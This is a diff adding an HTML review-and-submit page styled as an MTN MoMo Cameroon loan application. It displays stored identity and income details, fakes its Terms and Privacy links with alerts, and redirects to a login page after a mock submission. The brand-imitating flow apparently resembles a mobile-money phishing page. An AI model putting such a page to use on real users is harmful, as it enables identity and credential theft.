@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan - Review & Submit</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #eef1f6;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 71, 171, 0.06);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            background: #f0f4ff;
+            border: none;
+            cursor: pointer;
+            color: #0047AB;
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s, background 0.2s;
+            font-weight: 700;
+        }
+        .back-btn:hover {
+            transform: translateX(-2px);
+            background: #e0e9ff;
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 8px 18px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 6px 18px rgba(0,71,171,0.3);
+        }
+
+        .step-badge {
+            background: linear-gradient(135deg, #FFCC00, #FFB800);
+            color: #1a1a2e;
+            font-weight: 800;
+            font-size: 11px;
+            padding: 6px 10px;
+            border-radius: 8px;
+            letter-spacing: 0.3px;
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 28px 24px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 20px 50px rgba(0, 71, 171, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+            scroll-behavior: smooth;
+        }
+        .card::-webkit-scrollbar { width: 4px; }
+        .card::-webkit-scrollbar-thumb {
+            background: #d4dbe8;
+            border-radius: 4px;
+        }
+
+        /* ===== TITLE ===== */
+        .form-title {
+            font-size: 24px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+            letter-spacing: -0.4px;
+        }
+        .form-title .highlight { color: #0047AB; }
+
+        .form-subtitle {
+            text-align: center;
+            color: #8a90a2;
+            font-size: 13px;
+            margin-bottom: 18px;
+            font-weight: 500;
+        }
+
+        /* ===== SEGMENTED PROGRESS ===== */
+        .steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 6px;
+        }
+        .step-dot {
+            width: 34px;
+            height: 6px;
+            border-radius: 4px;
+            background: #e0e6f0;
+            transition: all 0.4s ease;
+        }
+        .step-dot.done {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            opacity: 0.55;
+        }
+        .step-dot.active {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            width: 46px;
+            box-shadow: 0 2px 8px rgba(0,71,171,0.35);
+        }
+
+        .step-text {
+            text-align: center;
+            color: #0047AB;
+            font-size: 13px;
+            margin-bottom: 22px;
+            font-weight: 700;
+            letter-spacing: 0.2px;
+        }
+
+        /* ===== SUMMARY SECTIONS ===== */
+        .summary-section {
+            background: #f8fafd;
+            border: 1.5px solid #e6ebf5;
+            border-radius: 16px;
+            padding: 16px 18px;
+            margin-bottom: 14px;
+        }
+
+        .summary-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .summary-header h3 {
+            font-size: 14px;
+            font-weight: 800;
+            color: #1a1a2e;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: -0.2px;
+        }
+        .summary-header h3 .header-icon {
+            font-size: 16px;
+        }
+
+        .edit-link {
+            font-size: 12px;
+            color: #0047AB;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.15s;
+        }
+        .edit-link:hover { background: #eef3ff; }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 9px 0;
+            border-bottom: 1px dashed #e0e6f0;
+            font-size: 13.5px;
+        }
+        .summary-row:last-child { border-bottom: none; padding-bottom: 0; }
+        .summary-row:first-of-type { padding-top: 0; }
+
+        .summary-row .k {
+            color: #8a90a2;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+        .summary-row .v {
+            color: #1a1a2e;
+            font-weight: 700;
+            text-align: right;
+            word-break: break-word;
+        }
+        .summary-row .v.amount {
+            color: #0047AB;
+            font-size: 15px;
+            letter-spacing: -0.2px;
+        }
+
+        /* ===== TERMS BOX ===== */
+        .terms-box {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            background: #fffaf0;
+            border: 1.5px solid #ffe7b0;
+            border-radius: 14px;
+            padding: 14px 16px;
+            margin-top: 6px;
+            margin-bottom: 4px;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+            user-select: none;
+        }
+        .terms-box:hover { background: #fff6e0; }
+        .terms-box.checked {
+            background: #eef3ff;
+            border-color: #b8ccf5;
+        }
+        .terms-box.invalid {
+            border-color: #e74c3c;
+            background: #fff5f5;
+            animation: shake 0.4s ease;
+        }
+
+        .checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #d0d7e3;
+            border-radius: 7px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            transition: all 0.2s;
+            margin-top: 1px;
+        }
+        .terms-box.checked .checkbox {
+            background: #0047AB;
+            border-color: #0047AB;
+        }
+        .checkbox::after {
+            content: "✓";
+            color: white;
+            font-weight: 900;
+            font-size: 14px;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.2s;
+        }
+        .terms-box.checked .checkbox::after {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .terms-text {
+            font-size: 12.5px;
+            color: #555;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        .terms-text a {
+            color: #0047AB;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        .terms-text a:hover { text-decoration: underline; }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 16px;
+        }
+
+        .prev-btn {
+            flex: 0 0 40%;
+            padding: 17px;
+            background: #f0f4ff;
+            color: #0047AB;
+            border: 2px solid #e0e9ff;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .prev-btn:hover {
+            background: #e0e9ff;
+            transform: translateY(-2px);
+        }
+        .prev-btn:active { transform: scale(0.98); }
+
+        .submit-btn {
+            flex: 1;
+            padding: 17px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 10px 25px rgba(0,71,171,0.28);
+            font-family: 'Inter', sans-serif;
+            position: relative;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 32px rgba(0, 71, 171, 0.4);
+        }
+        .submit-btn:active { transform: scale(0.98); }
+        .submit-btn::after {
+            content: "→";
+            margin-left: 6px;
+            transition: transform 0.25s;
+            display: inline-block;
+        }
+        .submit-btn:hover::after { transform: translateX(4px); }
+
+        /* ===== SUCCESS OVERLAY ===== */
+        .success-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 30, 80, 0.55);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9000;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .success-overlay.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .success-card {
+            background: white;
+            border-radius: 24px;
+            padding: 34px 26px 28px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.35);
+            animation: popIn 0.5s cubic-bezier(0.22,1,0.36,1) both;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.9) translateY(20px); opacity: 0; }
+            to   { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        .success-icon {
+            width: 76px;
+            height: 76px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #16a34a, #15803d);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            box-shadow: 0 12px 30px rgba(22,163,74,0.35);
+            animation: pulseIn 0.6s ease 0.2s both;
+        }
+        @keyframes pulseIn {
+            0% { transform: scale(0); }
+            60% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+        .success-icon::after {
+            content: "✓";
+            color: white;
+            font-size: 40px;
+            font-weight: 900;
+            line-height: 1;
+        }
+
+        .success-card h2 {
+            font-size: 20px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+        .success-card p {
+            font-size: 13.5px;
+            color: #8a90a2;
+            line-height: 1.5;
+            margin-bottom: 18px;
+            font-weight: 500;
+        }
+
+        .ref-box {
+            background: #f8fafd;
+            border: 1.5px dashed #b8ccf5;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 20px;
+        }
+        .ref-box .ref-label {
+            font-size: 11px;
+            color: #8a90a2;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        .ref-box .ref-value {
+            font-size: 17px;
+            font-weight: 800;
+            color: #0047AB;
+            letter-spacing: 0.5px;
+        }
+
+        .success-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 10px 25px rgba(0,71,171,0.28);
+            letter-spacing: 0.4px;
+        }
+        .success-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 32px rgba(0,71,171,0.4);
+        }
+
+        .redirect-note {
+            margin-top: 14px;
+            font-size: 11.5px;
+            color: #a9b0c2;
+            font-weight: 600;
+        }
+
+        footer {
+            padding: 14px;
+            color: #a9b0c2;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+            font-weight: 500;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 22px 16px; }
+            .form-title { font-size: 21px; }
+            .btn-row { flex-direction: column-reverse; }
+            .prev-btn { flex: 1; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='details.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <span class="step-badge">STEP 3/3</span>
+    </header>
+
+    <main class="card">
+        <h1 class="form-title">✅ Review & <span class="highlight">Confirm</span></h1>
+        <p class="form-subtitle">Please check that everything is correct</p>
+
+        <div class="steps">
+            <div class="step-dot done"></div>
+            <div class="step-dot done"></div>
+            <div class="step-dot active"></div>
+        </div>
+        <div class="step-text">STEP 3 OF 3 · Confirm & Submit</div>
+
+        <!-- ===== LOAN SUMMARY ===== -->
+        <div class="summary-section">
+            <div class="summary-header">
+                <h3><span class="header-icon">💰</span> Loan Details</h3>
+                <a class="edit-link" onclick="window.location.href='application.html'">Edit</a>
+            </div>
+            <div class="summary-row">
+                <span class="k">Product</span>
+                <span class="v" id="sumProduct">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Amount</span>
+                <span class="v amount" id="sumAmount">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Term</span>
+                <span class="v" id="sumTerm">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Purpose</span>
+                <span class="v" id="sumPurpose">—</span>
+            </div>
+        </div>
+
+        <!-- ===== PERSONAL SUMMARY ===== -->
+        <div class="summary-section">
+            <div class="summary-header">
+                <h3><span class="header-icon">👤</span> Personal Details</h3>
+                <a class="edit-link" onclick="window.location.href='details.html'">Edit</a>
+            </div>
+            <div class="summary-row">
+                <span class="k">Full Name</span>
+                <span class="v" id="sumName">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">MoMo Number</span>
+                <span class="v" id="sumPhone">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Date of Birth</span>
+                <span class="v" id="sumDob">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">ID Number</span>
+                <span class="v" id="sumId">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Region / City</span>
+                <span class="v" id="sumLocation">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Occupation</span>
+                <span class="v" id="sumOccupation">—</span>
+            </div>
+            <div class="summary-row">
+                <span class="k">Monthly Income</span>
+                <span class="v" id="sumIncome">—</span>
+            </div>
+        </div>
+
+        <!-- ===== TERMS ===== -->
+        <div class="terms-box" id="termsBox">
+            <div class="checkbox"></div>
+            <div class="terms-text">
+                I confirm that the information provided is accurate and I agree to the
+                <a href="#" onclick="event.stopPropagation(); alert('Terms & Conditions'); return false;">Terms & Conditions</a>
+                and
+                <a href="#" onclick="event.stopPropagation(); alert('Privacy Policy'); return false;">Privacy Policy</a>
+                of MTN MoMo Loans.
+            </div>
+        </div>
+
+        <!-- ===== BUTTONS ===== -->
+        <div class="btn-row">
+            <button class="prev-btn" onclick="window.location.href='details.html'">← BACK</button>
+            <button class="submit-btn" id="submitBtn">CONFIRM & SUBMIT</button>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <!-- ===== SUCCESS OVERLAY ===== -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-card">
+            <div class="success-icon"></div>
+            <h2>Application Submitted!</h2>
+            <p>Your loan request has been received successfully. Log in to track its status.</p>
+
+            <div class="ref-box">
+                <div class="ref-label">Reference Number</div>
+                <div class="ref-value" id="refNumber">—</div>
+            </div>
+
+            <button class="success-btn" id="goToLogin">CONTINUE TO LOGIN →</button>
+            <div class="redirect-note">Redirecting in <span id="countdown">5</span>s…</div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // SILENT LANGUAGE CHECK
+        // ============================================
+        const userLang = localStorage.getItem('momoLang') || 'en';
+
+        // ============================================
+        // POPULATE SUMMARY FROM localStorage
+        // ============================================
+        const fmt = (n) => 'XAF ' + Number(n).toLocaleString();
+
+        const loanType    = localStorage.getItem('loanType')     || '—';
+        const loanAmount  = localStorage.getItem('loanAmount')   || '—';
+        const loanTerm    = localStorage.getItem('loanTerm')     || '—';
+        const loanPurpose = localStorage.getItem('loanPurpose')  || '—';
+
+        const fullName    = localStorage.getItem('details_fullName')   || '—';
+        const phone       = localStorage.getItem('details_phone')      || '—';
+        const dob         = localStorage.getItem('details_dob')        || '—';
+        const idNumber    = localStorage.getItem('details_idNumber')   || '—';
+        const region      = localStorage.getItem('details_region')     || '—';
+        const city        = localStorage.getItem('details_city')       || '—';
+        const occupation  = localStorage.getItem('details_occupation') || '—';
+        const income      = localStorage.getItem('details_income')     || '—';
+
+        document.getElementById('sumProduct').textContent  = loanType;
+        document.getElementById('sumAmount').textContent   = loanAmount !== '—' ? fmt(loanAmount) : '—';
+        document.getElementById('sumTerm').textContent     = loanTerm !== '—' ? loanTerm + ' Months' : '—';
+        document.getElementById('sumPurpose').textContent  = loanPurpose;
+
+        document.getElementById('sumName').textContent     = fullName;
+        document.getElementById('sumPhone').textContent    = phone;
+        document.getElementById('sumDob').textContent      = dob;
+        document.getElementById('sumId').textContent       = idNumber;
+        document.getElementById('sumLocation').textContent = region + (city !== '—' ? ' / ' + city : '');
+        document.getElementById('sumOccupation').textContent = occupation;
+        document.getElementById('sumIncome').textContent   = income !== '—' ? fmt(income) : '—';
+
+        // ============================================
+        // TERMS CHECKBOX TOGGLE
+        // ============================================
+        const termsBox = document.getElementById('termsBox');
+        let termsAgreed = false;
+
+        termsBox.addEventListener('click', () => {
+            termsAgreed = !termsAgreed;
+            termsBox.classList.toggle('checked', termsAgreed);
+            termsBox.classList.remove('invalid');
+        });
+
+        // ============================================
+        // SUBMIT
+        // ============================================
+        document.getElementById('submitBtn').addEventListener('click', () => {
+            if (!termsAgreed) {
+                termsBox.classList.add('invalid');
+                termsBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return;
+            }
+
+            // Generate reference number
+            const ref = 'MM' + Date.now().toString().slice(-8) + Math.floor(Math.random() * 90 + 10);
+            localStorage.setItem('loanRef', ref);
+
+            // Mark submitted
+            localStorage.setItem('loanSubmitted', 'true');
+
+            // Show success overlay
+            document.getElementById('refNumber').textContent = ref;
+            const overlay = document.getElementById('successOverlay');
+            overlay.classList.add('show');
+
+            // Countdown to login page
+            let seconds = 5;
+            const cd = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                seconds--;
+                cd.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    window.location.href = 'login.html';
+                }
+            }, 1000);
+
+            // Manual "Continue to Login" button
+            document.getElementById('goToLogin').addEventListener('click', () => {
+                clearInterval(timer);
+                window.location.href = 'login.html';
+            });
+        });
+    </script>
+</body>
+</html>
